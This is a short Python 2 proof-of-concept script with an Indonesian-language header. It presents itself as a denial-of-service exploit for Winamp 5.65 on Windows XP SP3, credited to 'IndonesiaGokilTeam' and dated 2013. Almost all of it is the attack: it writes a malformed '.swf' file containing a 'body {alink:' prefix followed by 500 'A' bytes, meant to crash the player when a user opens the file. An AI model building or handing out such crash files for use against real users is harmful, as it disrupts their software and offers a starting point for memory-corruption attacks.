# !/usr/bin/python
print """
 [+]Judul Ledakan:Winamp 5.65 Denial of Service Exploit
 [+]Celah versi: Version 5.65
 [+]Mengunduh produk: http://download.nullsoft.com/winamp/client/winamp565_full_emusic-7plus_all.exe
 [+]Hari Tanggal Tahun: minggu, 28.07.2013
 [+]Penulis: IndonesiaGokilTeam
 [+]Email: indonesiagokilteam@yahoo.com
 [+]Dicoba di sistem operasi: Windows xp sp 3
 """
kepala="\nbody {alink:"
ledakan= "\x41" * 500
try:
    rst= open("SampahMasyarakat.swf",'w')
    rst.write(kepala+ledakan)
    rst.close()
    print("\nFile Sampah Masyarakat dibuat !\n")
    print("Matur Nuwun ( Thank You )\n")
except:
    print "Gagal"

